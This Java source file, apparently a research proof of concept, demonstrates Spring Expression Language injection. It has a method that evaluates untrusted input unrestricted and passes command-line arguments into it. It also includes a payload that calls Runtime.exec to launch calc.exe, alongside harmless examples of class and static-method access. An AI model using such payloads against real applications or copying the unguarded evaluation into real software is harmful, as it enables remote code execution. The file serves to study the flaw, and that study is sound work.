package com.SugarP1g.spelInjection;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class POC {

    public static Expression weakSpelCall(String expStr) {
        ExpressionParser parser = new SpelExpressionParser();
        return parser.parseExpression(expStr);
    }


    public static void test() {
        ExpressionParser parser = new SpelExpressionParser();
        // java.lang 包类访问
        Class<String> result1 = parser.parseExpression("T(String)").getValue(Class.class);
        System.out.println(result1);
        //其他包类访问
        String expression2 = "T(java.lang.Runtime).getRuntime().exec('calc.exe')";
        Class<Object> result2 = parser.parseExpression(expression2).getValue(Class.class);
        System.out.println(result2);
        //类静态字段访问
        int result3 = parser.parseExpression("T(Integer).MAX_VALUE").getValue(int.class);
        System.out.println(result3);
        //类静态方法调用
        int result4 = parser.parseExpression("T(Integer).parseInt('1')").getValue(int.class);
        System.out.println(result4);
    }

    public static void main(String[] args) {

        String exp = args[1];
        weakSpelCall(exp);

    }
}
